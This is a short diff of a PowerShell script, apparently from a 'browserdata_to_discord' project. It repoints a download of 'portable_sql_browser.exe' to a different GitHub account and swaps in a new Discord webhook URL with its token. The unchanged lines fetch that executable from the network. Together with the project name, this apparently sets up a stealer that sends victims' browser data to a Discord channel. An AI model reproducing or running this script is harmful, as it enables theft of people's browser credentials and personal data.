@@ -1,8 +1,8 @@
-$DOWNLOAD_URL = "https://github.com/pentestfunctions/browserdata_to_discord/raw/main/portable_sql_browser.exe"
+$DOWNLOAD_URL = "https://github.com/jimmy-mc/browserdata_to_discord/raw/main/portable_sql_browser.exe"
 $FILENAME = "portable_sql_browser.exe"
 $CURRENT_DIR = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition
 # Define the webhook URL
-$WEBHOOK_URL = "https://discord.com/api/webhooks/1349502044851011695/8AUBD4eCbSNyBglLoiTE9jTETy8JipRw-6NqU1v2VtbKSYWN_5mkyVsVECCCXhxYI4T4"
+$WEBHOOK_URL = "https://discord.com/api/webhooks/1370846850235764856/GclOjnWrIlTaIvHKshZzcX4YcOTJTP-rQf_NDBY7KzJU03bzLXAn3W-E9kKnIiCwXubE"
 
 if (!(Test-Path $FILENAME)) {
     Invoke-WebRequest -Uri $DOWNLOAD_URL -OutFile $FILENAME
